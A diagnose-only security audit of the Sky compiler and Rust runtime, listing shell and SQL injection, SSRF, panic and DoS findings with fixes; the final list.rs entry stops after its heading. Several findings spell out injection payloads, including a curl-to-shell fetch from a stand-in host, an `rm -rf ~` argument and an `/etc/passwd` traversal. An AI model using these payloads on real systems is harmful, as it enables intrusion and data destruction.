# Whole-codebase SECURITY audit — 2026-06-19 (diagnose-only)

120 in-scope code+script files, 10 read-only security-lens agents. Verdicts: 97 sound · 18 weak-but-bounded · 3 exploitable. Severities: 1 high · 5 medium · 82 low.
DIAGNOSE-ONLY pass (token budget) — NO fixes applied; dispositions below are ⏸️ filed.

## `app/Main.hs` — exploitable
- **high/injection** regenMissingBindings (line ~1062-1065) and Build/Run/Check/Install handlers via Toml._goDeps
  - exploit: Go dependency NAMES are read verbatim from the project's sky.toml `[go.dependencies]` table and spliced unquoted into a shell string: `callProcess "sh" ["-c", "cd sky-out && go get " ++ pkgList ++ " 2>&1 | ..."]` where pkgList = unwords (map fst missing). A sky.toml key like `"x; curl evil.sh | sh; #" = "latest"` executes arbitrary commands the moment `sky build`/`sky run`/`sky install`/`sky check` touches deps. This is the SkyDeploy threat model: the CLAUDE.md states SkyDeploy builds untrusted startup/user projects, so `sky build` runs on attacker-authored sky.toml — a remote build-server RCE. The dep name is never validated against a crates.io/Go-module charset.
  - fix: Never interpolate dep names into `sh -c`. Invoke go directly with an argument vector: `callProcess "go" (["get"] ++ map fst missing)` with `cwd = Just "sky-out"` (System.Process.proc{cwd=...}), so the shell never parses the names. Additionally validate each dep name against `^[A-Za-z0-9_./@-]+$` (Go module path charset) and reject `-`-leading names so they can't be read as go flags.
- **medium/injection** addHandler (line 941) `callProcess "sh" ["-c", "cd sky-out && go get " ++ pkg]`; Remove handler (line 2316) `... go mod edit -droprequire " ++ pkg ++ " && go mod tidy"`
  - exploit: The `sky add <PACKAGE>` / `sky remove <PACKAGE>` argument is interpolated raw into `sh -c`. `sky add 'x && rm -rf ~ #'` (or `sky remove '...; <cmd>'`) runs arbitrary shell. While normally developer-typed, AI agents and copy-pasted install snippets routinely run `sky add <attacker-supplied-name>`, and any automation that forwards an untrusted package string into `sky add` becomes an RCE primitive. No charset validation is applied to the argument.
  - fix: Drop the shell: `(System.Process.proc "go" ["get", pkg]){cwd=Just "sky-out"}` for add; for remove, run `go mod edit -droprequire pkg` and `go mod tidy` as two separate `proc` calls with an argument vector. Validate `pkg` against the Go-module/crate charset and reject leading `-`.
- **medium/injection** runScenarioRequest (line 472-478) — `method` interpolated unquoted: `unwords [..., "-X", method, ...]` then `sh -c cmd`
  - exploit: `sky verify` reads each example's verify.json and builds a curl shell command. `srMethod` (the JSON "method" field) is spliced into `sh -c` WITHOUT shellQuote (unlike url and body which are quoted). A verify.json with `"method": "GET; touch /tmp/pwned #"` executes arbitrary commands. `sky verify` runs over examples/*/, which on a CI/build-service ingesting untrusted repos is attacker-controlled — RCE during verification.
  - fix: shellQuote method like url/body (`shellQuote method`), or better run curl via an argument vector with `System.Process.proc "curl" [...]` so no field is shell-parsed. Also validate method against `^[A-Z]+$`.
- **low/injection** runScenario serverCmd / killPortHolder / lsof-kill paths (lines 343-397, 446-456) — port is `show (Int)` so numeric-safe, but pid/owner from `lsof`/`$!` are interpolated into `kill ... ` shell strings
  - exploit: `owner`/`pid` come from `lsof -ti`/`echo $!` output and are spliced into `sh -c "kill " ++ owner"`. They are filtered to the first whitespace-delimited token, and lsof emits only PIDs, so this is not directly attacker-controllable today. Defense-in-depth: if a future lsof wrapper or PATH-shadowed `lsof` returned crafted text, the kill string would execute it.
  - fix: Pass the pid as a vetted integer: `case reads owner of [(n,"")] -> proc "kill" [show (n::Int)]; _ -> skip`, never string-interpolate process output into a shell command.

## `runtime-rust/src/sky_runtime/time.rs` — exploitable
- **medium/panic-untrusted** time_format_in_zone (line 303: dt.format(&pattern).to_string()) and time_format (line 69: dt.format(&strfmt).to_string())
  - exploit: chrono 0.4's DelayedFormat returns Err from its Display impl on an invalid/unterminated format specifier (e.g. a stray '%' or '%!' with no valid token). std's .to_string()/format! PANICS when the Display impl returns Err ("a formatting trait implementation returned an error"). Both time_format_in_zone(pattern, zone, ms) and time_format(layout, ms) take the format string straight from a Sky String with no validation. A Sky.Live/Server app that routes a request-derived value into Time.format/Time.formatInZone (e.g. a user-supplied date layout, locale, or any reflected field) lets an attacker send a pattern containing a bad specifier and crash the request thread / abort the process — a reachable DoS from a well-typed Sky program, violating the no-runtime-panic invariant.
  - fix: Replace the panicking .to_string() with a non-panicking render: format into a String via write! and treat the fmt::Error as a fallback (e.g. let mut s=String::new(); if write!(s,"{}",dt.format(&pattern)).is_err() { return SkyResult::Err("invalid time format pattern".into()) } / for the infallible time_format return String::new()). Or pre-validate the pattern with chrono's StrftimeItems and reject any Item::Error before formatting.
- **low/dos-unbounded** time_format (lines 52-68) token replacement
  - exploit: layout is rebuilt via a chain of String::replace calls. A large attacker-controlled layout (Sky String) causes repeated full-string reallocation (O(n*k)); combined with the panic above this is a minor amplifier, not an independent vector.
  - fix: Bound the input layout length (e.g. reject > a few KB) and/or do a single tokenizing pass instead of 13 chained replaces; fold into the same validation as the panic fix.

## `runtime-rust/src/sky_runtime/http_client.rs` — exploitable
- **medium/ssrf** do_request() http_client.rs:50,57 — client.request(method, &req.url).send(); followRedirects default true with maxRedirects 10
  - exploit: Http.get/post/request issue outbound requests to a Sky-supplied URL with no host/scheme allow-listing and redirect-following ON by default (http_get/http_post hardcode followRedirects:true, maxRedirects:10). When a Sky app passes user/request-derived input as the URL (a common pattern: webhook fetch, link-preview, proxy), an attacker can target internal addresses (169.254.169.254 cloud metadata, 127.0.0.1, RFC1918) or use a redirect from an allowed host to an internal one. reqwest does not block private IPs by default. This is the classic SSRF sink.
  - fix: Add an opt-in SSRF guard: resolve the target host and reject private/link-local/loopback ranges (and re-check after each redirect via a custom redirect policy), or expose a deny-internal default with an explicit override flag on HttpRequest. At minimum default followRedirects to a policy that re-validates the post-redirect host.
- **low/panic-untrusted** do_request() http_client.rs:42 std::time::Duration::from_millis(req.timeout as u64)
  - exploit: req.timeout is i64 from Sky; the guard is `if req.timeout > 0` so negative is excluded, and `as u64` of a positive i64 is total. No panic. Noted as checked-not-broken.
  - fix: None required.

## `runtime-rust/src/sky_runtime/money.rs` — weak-but-bounded
- **low/panic-untrusted** money_allocate:216-217 (total_minor = amount.0 * scale; base * parts_dec)
  - exploit: amount is a Sky Decimal reachable from well-typed Sky code (Money.allocate). rust_decimal's operator `*` panics (`panic!("Multiplication overflowed")`) when the scaled product exceeds Decimal's 96-bit mantissa. A caller passing a near-MAX Decimal amount with places=8 (BTC) multiplies by 10^8, which can overflow → panic → DoS, contradicting the runtime's no-panic-from-well-typed-Sky invariant. money_format's `format!("{:.*}", ...)` does not overflow, but the allocate multiply/subtract chain (`amount.0 * scale`, `base * parts_dec`) uses bare panicking operators.
  - fix: Use rust_decimal's checked_mul / checked_sub (return Option) and saturate or return an empty Vec / structured fallback on None, mirroring the checked_pow guard already used for `factor` on line 212. e.g. `let total_minor = match amount.0.checked_mul(scale) { Some(v) => v.trunc(), None => return Vec::new() };`.
- **low/weak-crypto** money_set_rate:158 (inv = RD::from(1) / rate.0)
  - exploit: Not security-sensitive (FX registry, no secret). Division by an extreme-magnitude rate could in principle panic in rust_decimal, but rate is gated `> 0` and the registry is operator/test-only state, not attacker-reachable via a network boundary. Bounded.
  - fix: Optional: guard the inverse with checked_div and skip auto-inverse registration on None rather than relying on the non-zero check.

## `runtime-rust/src/sky_runtime/db.rs` — weak-but-bounded
- **low/injection** db_unsafe_find_where:883-894
  - exploit: `db_unsafe_find_where` interpolates the caller-supplied `where_clause` directly into `SELECT * FROM {qtable} WHERE {where_clause}` with no validation; only positional `args` are bound. If a Sky program ever routes untrusted (request/body/header) data into the where-clause string, arbitrary SQL is injectable (sub-selects, UNION, stacked statements where the driver allows). This is the named `unsafeFindWhere` contract and matches the Go backend, so the trust boundary is the developer, not an end user — but it is the one kernel here that splices SQL.
  - fix: No runtime change needed (contract is intentional + named `unsafe`). Defensive option: document that `where_clause` must be a static literal and add a debug-build lint/grep in codegen that flags `unsafeFindWhere` fed a non-literal; or expose only `findByConditions` for dynamic predicates.
- **low/dos-unbounded** row_to_map / row_to_json:127-182 and all fetch_all paths
  - exploit: `fetch_all_routed` materialises an entire result set into `Vec<HashMap<String,String>>` / `Vec<JsonVal>` with no row cap. A query the developer writes against attacker-influenced filters that match a huge table loads every row into RAM. Bounded by the developer's own SQL, not directly by an end user, so impact is limited.
  - fix: Mirror any Go-side LIMIT defaults; optionally expose a max-rows guard env (e.g. SKY_DB_MAX_ROWS) consulted in the fetch_all helpers.

## `runtime-rust/scripts/web-verify.mjs` — weak-but-bounded
- **low/other** chromium.launch args ['--no-sandbox']:118
  - exploit: The verification driver launches system chromium with --no-sandbox. If this script were ever pointed at attacker-controlled HTML/JS (it loads the local example server only), a browser-sandbox-escape exploit would run unconfined. In the intended use (CI/dev verifying first-party Sky examples on localhost) the input is trusted, so the exposure is bounded.
  - fix: Keep --no-sandbox only where the kernel sandbox is unavailable (CI containers); prefer a seccomp/user-namespace sandbox when present, and never run this driver against untrusted origins.

## `runtime-rust/src/sky_runtime/uuid_kernel.rs (cross-ref csrf.rs cookie_value)` — weak-but-bounded
- **low/other** live/csrf.rs:cookie_value:86-97 (used by mod.rs CSRF token read)
  - exploit: cookie_value matches the cookie name with strip_prefix(name) rather than an exact key compare, so a cookie literally named `__Host-sky_csrf=...` is matched but so could an unintended longer name share the prefix if a future name were a prefix of another. Today it is not exploitable: after strip_prefix(name) it requires the very next char to be '=' (strip_prefix('=')), so `__sky_csrf_x=v` is rejected and only an exact `name=` matches; and the token still goes through a constant-time double-submit compare against the header. Recorded as defense-in-depth: prefix-keyed cookie parsing is a fragile pattern if a new cookie name ever becomes a prefix of another.
  - fix: Parse cookies with split_once('=') and compare the key exactly (key.trim()==name), as sid_from_cookie in mod.rs already does, instead of strip_prefix(name)+strip_prefix('=').

## `runtime-rust/src/sky_runtime/file.rs` — weak-but-bounded
- **low/path-traversal** all file_* kernels (file_read_file, file_write_file, file_remove, file_copy, file_rename, file_mkdir_all, etc.)
  - exploit: Every kernel passes the Sky-provided path straight to std::fs with no normalization or root-confinement. A Sky.Live/Server handler that builds a File.readFile / File.writeFile / File.remove path from a request value (e.g. a download endpoint using a filename query param) gives an attacker `../../etc/passwd` read or arbitrary-path write/delete. This is by-design for a general-purpose File stdlib (the Sky program owns the path, mirroring Go's os.* kernels) and returns Err rather than panicking on failure, so it is not a runtime soundness defect — but it is a footgun any app that threads untrusted input into a path will trip. Read/write are byte-bounded (10 MiB default cap on readFileLimit/readFileBytes) so no unbounded-alloc DoS.
  - fix: No runtime change mandated (matches Go semantics). Document the traversal risk in the File stdlib docs and recommend Sky.Core.Path-based confinement; consider an optional rooted-FS helper for apps serving user-named files. Not a runtime panic, so it does not violate the no-panic invariant.

## `runtime-rust/src/sky_runtime/live/hub.rs` — weak-but-bounded
- **low/dos-unbounded** hub_read_service_stats / aggregate_service_stat (lines 655-690, 555-580)
  - exploit: hub_read_service_stats enumerates every DISTINCT service_name across three telemetry tables (UNION query, no LIMIT) then runs aggregate_service_stat per service, each firing 2 more SELECTs (cap 10_000 rows each). A telemetry producer pushing many distinct service_name values (the OTLP/federation ingest path writes service_name from the sub-app label) inflates the distinct set, so one console read fans out to 1 + 2N queries with N attacker-influenced. The console read path is the only caller; not request-amplified, but a large N makes a single dashboard refresh expensive.
  - fix: Cap the distinct-services list (e.g. ORDER BY ... LIMIT 200) the same way logs/metrics/errors are LOG_LIMIT/METRIC_LIMIT capped; the Go bridge caps similarly.
- **low/injection** open_spill line 721 (format!("sqlite:{db_path}?mode=rw"))
  - exploit: db_path is interpolated raw into the SQLite connection URL. Its source is operator-controlled (SKY_CONSOLE_HUB_DB env / the dbPath Sky arg), not a network attacker, so this is not a remote vector. If a db_path ever contained a '?' or URL-param it could append/override connection options (e.g. mode), but only an operator can set it.
  - fix: Percent-encode db_path or use SqliteConnectOptions::from_path/filename instead of string-formatting a URL, so a '?' in the path can't inject connect params.

## `runtime-rust/scripts/rust-perf.sh` — weak-but-bounded
- **low/injection** active_handler / probe_broadcast (lines 202-206, 354-364)
  - exploit: Handler IDs are scraped from the served HTML with grep -oP and interpolated unquoted into a JSON body string and curl args. A malicious server under test could embed a data-sky-hid value with quotes/JSON metacharacters to break out of the JSON body. This is a dev/CI perf harness driving localhost binaries it just built — there is no production trust boundary and the 'server' is the artifact under test, so impact is confined to a corrupted local benchmark, not a security bypass.
  - fix: Defense-in-depth only: validate scraped hid against ^[A-Za-z0-9_-]+$ before embedding, mirroring the existing numval() sanitisation applied to numeric probe output.

## `runtime-rust/src/sky_runtime/live/push_exporter.rs` — weak-but-bounded
- **low/ssrf** enable_from_env line 50-59, flush line 148-159
  - exploit: The exporter POSTs telemetry to SKY_PARENT_URL (joined with /_sky/observability/ingest) on a timer. The destination is fully attacker-controllable ONLY if an attacker can set the SKY_PARENT_URL env var, which is operator/orchestrator config (the parent injects it when spawning a sub-app). So it is not a remote SSRF: no request-derived value reaches the URL. Worth noting because the URL is unvalidated (any scheme/host) and the bearer token from SKY_INGEST_TOKEN is sent to whatever host that env names — an operator misconfiguration could leak the token to an arbitrary host.
  - fix: Optionally restrict the push URL scheme to http/https and document that SKY_PARENT_URL must be trusted; no code change needed for the threat model where env is operator-owned.

## `runtime-rust/src/sky_runtime/live/csrf.rs` — weak-but-bounded
- **low/race-toctou** cookies_secure()/csrf_cookie_name()/csrf_set_cookie() reading SKY_LIVE_FRAME_ANCESTORS, ENV via std::env::var on every request
  - exploit: No direct attacker exploit: the env vars are process-boot config, not request-controlled. Flagged only because cookie name/SameSite are recomputed per request from env; if env were mutated at runtime (System.setenv kernel exists) a read/write the cookie name could diverge between Set-Cookie write and validation read within a session, causing a self-DoS (legit POSTs rejected as csrf_missing), not a bypass. Bounded — not network-reachable.
  - fix: Snapshot cookies_secure()/frame_ancestors() once at boot into a OnceLock rather than re-reading env per request.
- **low/auth-bypass** origin_mismatch() csrf.rs:146-149 — returns false (allow) when Origin header is absent
  - exploit: The opt-in Origin check (SKY_LIVE_CSRF_ORIGIN_CHECK=on) is skipped entirely when no Origin header is present. A cross-site form-POST that suppresses Origin would pass the origin layer. Real exploitation still blocked by the double-submit token + SameSite=Strict (an attacker cannot read/forge the __Host-sky_csrf cookie), so this is a defense-in-depth gap, not a usable bypass.
  - fix: When the origin check is enabled, treat an absent Origin on a mutating request as a rejection (or fall back to Referer), so the third layer can't be silently dropped.

## `runtime-rust/src/sky_runtime/email.rs` — weak-but-bounded
- **low/ssrf** send_smtp() email.rs:511-521 — AsyncSmtpTransport::builder_dangerous(&cfg.host) with Tls::Opportunistic
  - exploit: Opportunistic STARTTLS means a network MITM that strips the server's STARTTLS advertisement causes credentials (Credentials::new(user, pass)) + message to be sent in plaintext. The host/port come from app config (SmtpConfig), not network input, so this is an operator-facing posture (documented as Go-parity), not an attacker-triggered bypass. No SSRF restriction on cfg.host either, but host is config-supplied.
  - fix: Offer a Tls::Required (or Tls::Wrapper) option on SmtpConfig so credentials are never sent over an un-upgraded channel; default opportunistic only for the no-auth case.

## `runtime-rust/src/sky_runtime/ws_client.rs` — weak-but-bounded
- **low/dos-unbounded** do_connect() reader task ws_client.rs:186-201 — Ok(Message::Text(t))/Binary(b) forwarded with no per-message size cap; frames broadcast channel cap 64
  - exploit: An attacker-controlled WebSocket server (the client connects outbound to a Sky-supplied URL) can send arbitrarily large Text/Binary frames; each is allocated in full and rebroadcast. tokio-tungstenite has a default max-message size, so this is bounded by that default rather than unbounded, but the runtime sets no explicit cap and a hostile endpoint can drive memory/CPU. Reachable only when the Sky program connects to an untrusted URL.
  - fix: Set an explicit WebSocketConfig max_message_size / max_frame_size on the tungstenite handshake (tie it to cfg) rather than relying on the library default.

## `tools/skydex/src/store.rs` — weak-but-bounded
- **low/injection** Store::count() store.rs:55 format!("SELECT COUNT(*) FROM {table}")
  - exploit: `table` is interpolated into SQL, not bound. It is guarded by an explicit allowlist match (files|symbols|edges|kernels|meta) that bails on anything else, and all current callers pass hardcoded literals. So no injection is reachable today; the risk is only a future caller bypassing the allowlist. Bounded by the existing guard.
  - fix: Keep the allowlist; additionally consider mapping the allowed names to a fixed &'static str returned from a match so the format string can never see external input.

## `src/Sky/Generate/Rust/Builder/Emitter.hs` — weak-but-bounded
- **low/injection** emitDepLine() Emitter.hs:1041-1050 — name ++ " = \"" ++ ver ++ "\"" and git url interpolated into Cargo.toml from sky.toml [rust.dependencies]
  - exploit: Crate name/version/git-url/rev/branch/tag from the project's sky.toml are interpolated into the generated Cargo.toml with no escaping (version uses raw `\"`-quoting; show used for git fields). A crafted sky.toml value containing a quote/newline could inject extra TOML keys or, via a git dep URL, point cargo at an attacker repo. This is a build-time, repo-author-controlled surface (whoever writes sky.toml already controls the build), so it is a self-targeting/supply-chain footgun rather than a remote vector. Not reachable from network/runtime input.
  - fix: Validate crate names against the cargo name grammar ([A-Za-z0-9_-]) and reject version/url/rev strings containing quote/newline/control chars before emitting; use a TOML serializer rather than hand-built string concatenation.
- **low/panic-untrusted** ffi_kernel_polyfill() Emitter.hs:289 — emits `panic!(...)` into generated Rust
  - exploit: A panic! is emitted into the generated crate as the body of ffi_kernel_polyfill. Per the file's own comment it is expected unreachable (codegen routes Ffi.kernel calls directly), but an inline let-binding of Ffi.kernel could leave a residual call that reaches this panic — contradicting the no-runtime-panic invariant. Not attacker-controlled; depends on a specific codegen residual shape. Bounded.
  - fix: Replace the panic! body with a total form that returns a SkyResult::Err / structured error, or make the residual-call shape a hard compile error in codegen so it can never reach a panicking runtime stub.

## `src/Sky/Build/Rust/Ffi.hs` — weak-but-bounded
- **low/injection** runRustInspectorWith:85-86 — `cmd' = bin ++ " " ++ quoteShell pkgPath ...` then `readProcessWithExitCode "sh" ["-c", cmd'] ""`
  - exploit: The inspector resolver path `bin` (from env var SKY_FFI_INSPECTOR_RS or a walked-up `bin/sky-ffi-inspect-rs`) is interpolated into the `sh -c` string WITHOUT quoteShell, unlike every other field (pkgPath/url/rev/branch/tag/features are all single-quote-escaped). If the repo is checked out under a path containing a shell metacharacter/space (e.g. `/home/u/my repo/bin/sky-ffi-inspect-rs`) or SKY_FFI_INSPECTOR_RS is set to such a value, the command word-splits and breaks or executes an unintended token. This is a build-time tool fed an operator/local-trusted path, not an attacker-controlled network input, so the practical blast radius is a broken build rather than a privilege escalation — but it is an inconsistency: the code carefully quotes the attacker-influenceable sky.toml-derived crate name while leaving the resolver path raw.
  - fix: Wrap `bin` in `quoteShell` too: `cmd' = quoteShell bin ++ " " ++ quoteShell pkgPath ++ ...`. Better still, drop `sh -c` entirely and pass the binary + an explicit argv list to `readProcessWithExitCode bin ["--features", ...] ""` so no shell parsing happens at all — quoteShell is only needed because the whole invocation is funneled through `sh -c`.

## `runtime-rust/src/sky_runtime/http_stream.rs` — weak-but-bounded
- **low/ssrf** http_stream_open:78-108 — `client.request(method, &req.url)` with no host/scheme restriction
  - exploit: If a Sky app builds an `HttpRequest` whose URL is derived from untrusted input (a user-supplied webhook/feed URL) and calls Http.Stream.open, the runtime issues the request to any host the attacker names, including internal/metadata endpoints (169.254.169.254, localhost admin ports). This is the standard SSRF surface of any HTTP client and is identical to the Go backend's Http.get/stream (no allowlist there either), so it is parity-bounded, not a Rust regression — the calling app owns URL validation. Redirects are bounded by `req.maxRedirects`, which limits redirect-based SSRF amplification.
  - fix: Parity-acceptable as-is. For defense-in-depth, expose an optional host/scheme allowlist or a `denyPrivateRanges` flag on HttpRequest so apps that forward user-supplied URLs can opt into blocking RFC1918 / loopback / link-local targets before the request fires; document that Http.Stream.open follows attacker-controlled URLs.
- **low/dos-unbounded** http_stream_open:55 + client_streams registry; comment acknowledges 'Calling open repeatedly without draining/closing leaks responses'
  - exploit: A Sky app that opens streams in a request-handler path but fails to pair every open with forEachChunk/close (e.g. on an early error branch) accumulates parked reqwest::Response entries (each holding an open connection) in the process-global HashMap. Driven in a loop this exhausts FDs/memory. Reachability requires an app-level open/close-balance bug, not a direct attacker primitive, and the registry only grows under the app's own control flow — so it is a footgun, not a remote DoS. The 30s connect_timeout bounds the header stage only, as noted.
  - fix: Add a bounded idle reaper (a max-entries cap or a TTL sweep) on client_streams so an abandoned-but-open stream is eventually evicted and its connection released, instead of relying solely on caller discipline. At minimum cap the map size and reject (Err) new opens past the cap.

## `runtime-rust/src/sky_runtime/compression.rs` — weak-but-bounded
- **medium/dos-unbounded** gunzip_bytes:21-27 (`d.read_to_end(&mut out)`) and compression_zstd_decompress:58 (`zstd::decode_all`)
  - exploit: Both decompressors expand attacker-controlled compressed input into an unbounded in-memory Vec<u8> with no output-size cap. A Sky app that decompresses any untrusted bytes — e.g. an HTTP handler doing `gunzip requestBody`, or unpacking a downloaded feed — is hit by a decompression bomb: a few KB of crafted gzip/zstd expands to gigabytes, OOM-killing the server (single-request DoS, or trivial amplification). The `String -> Task Error String` shape advertises a benign pure transform, hiding the unbounded allocation. The Go backend (runtime-go/rt/compression.go) is equally unbounded (io.ReadAll over the gzip reader / zstd.DecodeAll), so this is a SHARED pre-existing gap and parity-faithful — but it is still a live DoS the moment an app feeds untrusted compressed data, which the no-runtime-abort / production-grade goals make worth closing.
  - fix: Decompress through a size-bounded reader: cap `read_to_end` via `Read::take(MAX)` (gzip) and use zstd's streaming `Decoder` with a running byte counter (or `zstd::stream::read::Decoder` + `take`) instead of `decode_all`; return Err once the output exceeds a configurable limit (mirror SKY_LIVE_MAX_BODY_BYTES, e.g. a `SKY_DECOMPRESS_MAX_BYTES` default). File the matching bound on the Go side so parity holds. App authors should additionally cap input size before calling.

## `runtime-rust/src/sky_runtime/server.rs` — weak-but-bounded
- **low/dos-unbounded** ws_loop:531-546 (Message::Text / Message::Binary handling)
  - exploit: The per-message size guard runs AFTER axum has already buffered the full frame: `socket.recv()` yields the complete `Message::Text(t)` / `Message::Binary(b)` and only then is `t.len() > max_bytes` checked. axum/tokio-tungstenite default max frame is 64 MiB (not the Sky-configured `maxMessageBytes`, default 1 MiB), so a client can force allocation of frames far larger than the app's intended cap before the check trips. Repeated large frames across many connections amplify memory pressure. No call to set tokio-tungstenite's read limit to `max_bytes` up front.
  - fix: Configure the upgrade with `WebSocketUpgrade::max_message_size(max_bytes)` (or the axum-config equivalent) BEFORE `on_upgrade`, so the transport rejects oversized frames at the protocol layer instead of buffering then checking; keep the post-recv guard as defence-in-depth.
- **low/panic-untrusted** ws_loop:521 `cfg.maxMessageBytes as usize`; to_axum_response:363 `r.status as u16`; rate_limit_allow:820 `capacity.max(0) as f64`
  - exploit: These i64->usize / i64->u16 casts are lossy on the cap and status path. `r.status as u16` truncates a Sky-supplied status (e.g. 65536 -> 0) but `StatusCode::from_u16` validates and falls back to 500, so no panic. `maxMessageBytes as usize` on a 32-bit target could wrap a large positive i64 to a small cap. None reach a panic on 64-bit Linux (the shipped target), so this is bounded, not exploitable today.
  - fix: Clamp explicitly: `r.status.clamp(100, 599) as u16`; `usize::try_from(cfg.maxMessageBytes).unwrap_or(1<<20)`.
- **low/other** middleware_with_cors:710-717 (OPTIONS preflight)
  - exploit: Preflight OPTIONS always returns 204 with permissive `access-control-allow-methods/headers` even for paths/methods the wrapped handler would reject, and reflects any exact-listed origin. This is standard CORS behaviour and only matters if the origin allowlist is itself misconfigured (`origins` containing `*`); it never pairs `*` with credentials, so it is not a credential-exfil vector. Defense-in-depth note only.
  - fix: Acceptable as-is; if stricter behaviour is wanted, gate the preflight 204 on the route actually existing and echo only methods the route supports.

## `runtime-rust/scripts/static-perf.sh` — weak-but-bounded
- **low/dos-unbounded** cleanup:112 `pkill -f 'sky-app'`
  - exploit: On EXIT/INT/TERM the script `pkill -f 'sky-app'` kills every process of the invoking user whose full command line contains the substring 'sky-app' — not just the servers it spawned (tracked in SERVER_PIDS). A developer running an unrelated `sky-app`-named process (or an editor/path containing that string) on the same machine/CI runner would have it killed. Self-inflicted, same-user, local/CI-only; not remotely reachable.
  - fix: Reap only tracked PIDs (SERVER_PIDS already holds them); drop the broad `pkill -f` or scope it to the isolated CARGO_TARGET_DIR binary path with an anchored, escaped pattern.
- **low/other** clear_port:153-160 / boot_server:187-192 (kill -KILL of PIDs bound to the example port)
  - exploit: clear_port discovers and SIGKILLs whatever is listening on the example's hard-coded port (8000/80xx) to free it. On a shared CI host another user's or another job's process on that port could be killed. Same-host, requires colliding port; informational.
  - fix: Run sweeps in an isolated network namespace / container, or skip clear_port when the listening PID is not owned by the sweep.

## `src/Sky/Generate/Rust/Builder/ExprEmitter.hs` — sound
- **low/injection** exprToRustString / Binop "++" arms (lines 181, 1207) and substVar Call/Let arms
  - exploit: This module emits Rust source from the Sky AST. The risk surface is whether attacker-controlled DATA can flow into emitted Rust code. It cannot: string/char literals from the Sky source go through rustStringLit/rustCharLit (lines 673-692) which escape quotes, backslashes, control chars, and non-ASCII via \u{..}; runtime VALUES are emitted as Rust expressions (format!("{}{}",a,b), not as literals), so a Sky string value is never spliced into generated source text. SQL is bound positionally via sqlValueMatchArms/sqlFieldsToVec (values become SqlParam::Text, never interpolated) with table/column idents validated in the runtime (valid_sql_ident, noted line 1640). No build-time subprocess is fed Sky data here. The only inputs that become source tokens are compiler-controlled identifiers/types, not request/user data.
  - fix: No change needed. Keep the invariant that any Sky String/Char that originates from compile-time source goes through rustStringLit/rustCharLit and that runtime values are only ever emitted as expressions inside format!/positional binders, never concatenated into a Rust literal.

## `runtime-rust/src/sky_runtime/live/observability.rs` — sound
- **low/log-injection** track() lines 104-117 -> sanitise_path() lines 126-141
  - exploit: The request path is attacker-controlled and is fed into record_span/record_log. It is sanitised first: sanitise_path strips all control chars (is_control() drops ESC/NUL/CR/LF) and caps the byte length at 256 with a UTF-8-safe boundary check (out.len()+ch.len_utf8()>MAX before push), so neither ANSI/CRLF injection into the operator console nor per-entry memory amplification is reachable. method is from req.method().as_str() (a fixed token set). buildinfo()/metrics() interpolate only compile-time option_env! values and an AtomicU64 counter, so no runtime-data injection. dur_us is clamped with .min(u64::MAX) before the cast and dur_us/1000 cannot panic. The console/metrics gate (gate_blocked) is applied here before serving, and the sibling token compares use ct_eq.
  - fix: No change needed. The one residual nit (defense-in-depth, not a bug): record_log builds the line with format! including the method+path; since both are already sanitised/fixed this is safe, but keep sanitise_path as the mandatory chokepoint for any future field that joins the log line.

## `runtime-rust/src/sky_runtime/random.rs` — sound
- **low/weak-crypto** lcg_next() lines 13-25 (LCG) used by random_int/random_float/random_choice/random_shuffle/random_weighted
  - exploit: The LCG is a non-CSPRNG (state seeded from wall-clock nanos, fully predictable). This would be exploitable ONLY if its output backed a secret/token/session-id/nonce. It does not: grep confirms all security tokens (crypto_random_token, crypto_random_bytes, AES/ChaCha nonces, CSRF gen_token) use OsRng. random.rs implements Sky's Random.* surface, which is explicitly a non-cryptographic PRNG matching Go's math/rand — same security contract as the Go backend. Panic-safety is also clean: random_int does the modulo in u64 with wrapping_sub/wrapping_add and range.max(1), avoiding the i64::MIN.abs() overflow; the % items.len() draws are all guarded by is_empty() checks and items.get(idx) (never [idx]); seed_step uses wrapping_* throughout. No reachable panic from a Sky-controlled lo/hi/list.
  - fix: No change needed. To prevent future misuse, keep a doc note that lcg_* is non-cryptographic and that any new secret-generating kernel must use crypto.rs/OsRng, never lcg_next().

## `src/Sky/Generate/Rust/Builder/Pattern.hs` — sound
- **low/other** patternToRustArg lines 104-115 / patternIsIrrefutable lines 123-135
  - exploit: Pure pattern-to-Rust translation. Names route through rustSafeIdent/toCamelCase/rustVariantName (identifier sanitisation), so a Sky pattern variable cannot emit arbitrary Rust tokens. The refutable-pattern path emits `let <pat> = __pN else { unreachable!() };` — the unreachable! is on a pattern the caller's exhaustiveness proves dead, and dropping the else is gated on the conservative single-variant-enum set (False keeps the always-compiling else), so this neither introduces a runtime panic from well-typed Sky nor an injectable token. No untrusted-data path reaches this module (it runs at compile time over the typed AST).
  - fix: No change needed.

## `runtime-rust/src/sky_runtime/live/form.rs` — sound
- **low/dos-unbounded** decode_form lines 23-27
  - exploit: decode_form re-encodes the FormData map via serde_urlencoded::to_string then deserializes into T. FormData size is bounded upstream by the request body limit (the OnForm event payload), so this is not an independent unbounded-alloc vector. A decode failure (missing/ill-typed field) returns Err which decode_form_or_warn maps to None (no Msg dispatched) — no panic, no unwrap on untrusted input. The eprintln! warn line (line 38) prints the serde error string, which describes the field/type shape, not secret values; a password field that fails to parse would only surface its field-type error, and password fields decode as String (always succeeds) so the value is not echoed. No secret leakage and no injection (eprintln to stderr, not into a structured log sink an attacker controls).
  - fix: No change needed. Minor defense-in-depth: if a future T had a sensitive numeric/secret field whose raw value could appear in a serde parse error, prefer logging only the field name; today String fields never trigger a value-bearing error.

## `runtime-rust/src/sky_runtime/char_kernel.rs` — sound
- **low/panic-untrusted** char_from_code lines 29-34 / char_to_code line 26
  - exploit: All paths are total. char_from_code range-checks 0..=0x10FFFF before `n as u32` and falls back to char::from_u32(..).unwrap_or('\u{FFFD}') for surrogates, so no out-of-range cast or unwrap-panic is reachable from a Sky Int. char_to_code uses `c as u32 as i64` which is lossless and panic-free. Case/predicate helpers operate on a valid char. No untrusted-size, no integer overflow, no indexing.
  - fix: No change needed.

## `runtime-rust/src/sky_runtime/config.rs` — sound
- **low/other** SKY_DB_URL = "sqlite::memory:" line 10 / db_format_sql line 27
  - exploit: This is a standalone-crate stub that the Sky compiler OVERRIDES in generated projects (per the header comment and Project.hs per-driver emission), so its constants are not the production DB URL. db_format_sql is identity for sqlite (`?` placeholders) and is only the placeholder-style shim, not a query builder — it does not interpolate values. No secret is embedded (the in-memory sqlite URL is a test default, not a credential). No attacker-reachable path: this file has no request handling, no untrusted input, and is replaced before deployment.
  - fix: No change needed.

## `runtime-rust/src/sky_runtime/list.rs` — sound
- **low/panic-untrusted** list_drop (line 22-27) `xs.into_iter().skip(n as usize)`
